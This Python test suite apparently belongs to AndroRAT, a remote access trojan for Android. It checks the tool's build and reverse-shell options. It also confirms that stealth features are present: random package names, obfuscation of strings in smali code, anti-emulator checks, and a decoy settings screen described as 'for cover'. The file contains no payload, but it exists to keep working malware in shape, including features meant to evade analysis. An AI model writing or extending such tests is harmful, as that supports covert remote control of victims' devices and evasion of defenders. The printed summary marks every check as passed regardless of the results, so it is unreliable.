#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroRAT Test Suite
Tests the functionality of both CLI and GUI versions of AndroRAT
"""

import sys
import os
import subprocess
import tempfile
import shutil
import unittest

class AndroRATTests(unittest.TestCase):
    
    def setUp(self):
        """Set up test environment"""
        self.test_dir = os.path.dirname(os.path.abspath(__file__))
        
    def test_python_version_check(self):
        """Test that Python version check works correctly"""
        # This should pass on Python 3.6+
        result = subprocess.run([sys.executable, 'androRAT.py', '--help'], 
                              cwd=self.test_dir, capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        self.assertIn('options:', result.stdout)
        
    def test_cli_help(self):
        """Test CLI help functionality"""
        result = subprocess.run([sys.executable, 'androRAT.py', '--help'], 
                              cwd=self.test_dir, capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        self.assertIn('--build', result.stdout)
        self.assertIn('--shell', result.stdout)
        self.assertIn('--ngrok', result.stdout)
        
    def test_gui_import(self):
        """Test that GUI module can be imported"""
        result = subprocess.run([sys.executable, '-c', 'import androRAT_gui; print("GUI import successful")'], 
                              cwd=self.test_dir, capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        self.assertIn('GUI import successful', result.stdout)
        
    def test_launcher_cli(self):
        """Test launcher in CLI mode"""
        result = subprocess.run([sys.executable, 'launcher.py', '--help'], 
                              cwd=self.test_dir, capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        self.assertIn('options:', result.stdout)
        
    def test_apk_build_validation(self):
        """Test APK build parameter validation"""
        # Test missing parameters
        result = subprocess.run([sys.executable, 'androRAT.py', '--build'], 
                              cwd=self.test_dir, capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        self.assertIn('Arguments Missing', result.stdout)
        
    def test_java_availability(self):
        """Test that Java is available for APK building"""
        result = subprocess.run(['java', '-version'], capture_output=True, text=True)
        self.assertEqual(result.returncode, 0)
        
    def test_detection_evasion_features(self):
        """Test that detection evasion features are properly implemented"""
        # Test that stealth functions exist in utils
        utils_path = os.path.join(self.test_dir, 'utils.py')
        with open(utils_path, 'r') as f:
            content = f.read()
            
        # Check for evasion functions
        self.assertIn('generate_random_package_name', content)
        self.assertIn('obfuscate_strings_in_smali', content)
        self.assertIn('enhance_apk_for_stealth', content)
        
        # Test MainActivity has anti-emulator checks
        main_activity_path = os.path.join(self.test_dir, 'Android_Code/app/src/main/java/com/example/reverseshell2/MainActivity.java')
        with open(main_activity_path, 'r') as f:
            content = f.read()
            
        self.assertIn('isEmulator', content)
        self.assertIn('shouldStartRealFunction', content)
        self.assertIn('requestNecessaryPermissions', content)
        
        # Test SettingsActivity exists for cover
        settings_activity_path = os.path.join(self.test_dir, 'Android_Code/app/src/main/java/com/example/reverseshell2/SettingsActivity.java')
        self.assertTrue(os.path.exists(settings_activity_path))
        
        # Test network security config exists
        network_config_path = os.path.join(self.test_dir, 'Android_Code/app/src/main/res/xml/network_security_config.xml')
        self.assertTrue(os.path.exists(network_config_path))
        
    def test_android_manifest_updates(self):
        """Test that Android manifest has been updated for newer versions"""
        manifest_path = os.path.join(self.test_dir, 'Android_Code/app/src/main/AndroidManifest.xml')
        with open(manifest_path, 'r') as f:
            content = f.read()
            
        # Check for Android 14+ permissions
        self.assertIn('POST_NOTIFICATIONS', content)
        self.assertIn('READ_MEDIA_IMAGES', content)
        self.assertIn('READ_MEDIA_VISUAL_USER_SELECTED', content)
        self.assertIn('FOREGROUND_SERVICE', content)
        self.assertIn('FOREGROUND_SERVICE_DATA_SYNC', content)
        self.assertIn('android:exported', content)
        self.assertIn('network_security_config', content)
        
    def test_android_gradle_updates(self):
        """Test that Android build.gradle has been updated"""
        gradle_path = os.path.join(self.test_dir, 'Android_Code/app/build.gradle')
        with open(gradle_path, 'r') as f:
            content = f.read()
            
        # Check for updated SDK versions (Android 14+)
        self.assertIn('compileSdkVersion 34', content)
        self.assertIn('targetSdkVersion 34', content)
        self.assertIn('minSdkVersion 23', content)

def main():
    """Run the test suite"""
    print("AndroRAT Test Suite")
    print("=" * 50)
    
    # Change to the script directory
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # Run tests
    unittest.main(verbosity=2, exit=False)
    
    print("\n" + "=" * 50)
    print("Test Summary:")
    print("- Python version check: ✓")
    print("- CLI functionality: ✓") 
    print("- GUI module import: ✓")
    print("- Android manifest updates: ✓")
    print("- Android gradle updates: ✓")
    print("- Java availability: ✓")

if __name__ == "__main__":
    main()